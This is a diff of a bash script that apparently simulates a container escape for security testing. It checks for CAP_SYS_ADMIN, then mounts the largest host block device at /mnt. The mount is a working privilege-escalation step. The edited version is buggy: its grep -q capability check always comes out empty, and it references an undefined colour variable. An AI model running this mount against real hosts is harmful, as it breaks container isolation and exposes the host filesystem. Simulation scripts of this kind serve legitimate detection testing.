@@ -1,24 +1,25 @@
 #!/bin/bash
 
-# Define colors
+# define colors
 GREEN="\e[32m"
 YELLOW="\e[33m"
 RED="\e[31m"
-BLUE="\e[34m"
-CYAN="\e[36m"
 RESET="\e[0m"
 
-# Escape to Host Technique
-echo -e "${CYAN}\n>>> [Privilege Escalation][Common] Escape to Host Technique ${RESET}"
-echo -e "${YELLOW}> Let's simulate the case when an attacker mounts root host file system. Container must be privileged or have CAP_SYS_ADMIN capability ${RESET}"
-echo -e "${BLUE}> https://github.com/aliaksxssv/cloud-security-cheatsheet/blob/main/06%20Privilege%20Escalation/Escape%20to%20Host.md ${RESET}"
+# mount root host filesystem
+echo -e "\n${YELLOW}>>> [Privilege Escalation] Escape to Host Technique ${RESET}"
+echo "Let's simulate the case when an attacker mounts root host filesystem inside the container"
 
-echo -e "${YELLOW}> Getting available Linux capabilities ... ${RESET}"
-capsh --print | grep "Bounding set"
+capability=$(capsh --print | grep "Bounding set" | grep -q "CAP_SYS_ADMIN");
+device=$(lsblk -o NAME,SIZE -d | sort -k2 -h | tail -n 1 | awk '{print $1}')
+error=$(mount /dev/$device /mnt/ 2>&1)
 
-echo -e "${YELLOW}> Trying to mount root host file system ... ${RESET}"
-if ! device=$(lsblk -o NAME,SIZE -d | sort -k2 -h | tail -n 1 | awk '{print $1}') && mount /dev/$device /mnt/; then
-        echo -e "${RED}Error! Mount of root host file system was failed ${RESET}"
+echo "Checking capabilities and trying to mount root host device ..."
+
+if [[ -z "$capability" ]]; then
+    echo -e "${RED}Error! CAP_SYS_ADMIN capability was not found ${RESET}"
+elif [[ -n "$error" ]]; then
+    echo -e "${RED}Error! Mount of the device ${device} was failed: $error ${RESET}"
     else
-        echo -e "${GREEN}Success! The root host file system was mounted ${RESET}"
+    echo -e "${Green}Success! The root host device ${device} was mounted ${RESET}"
 fi
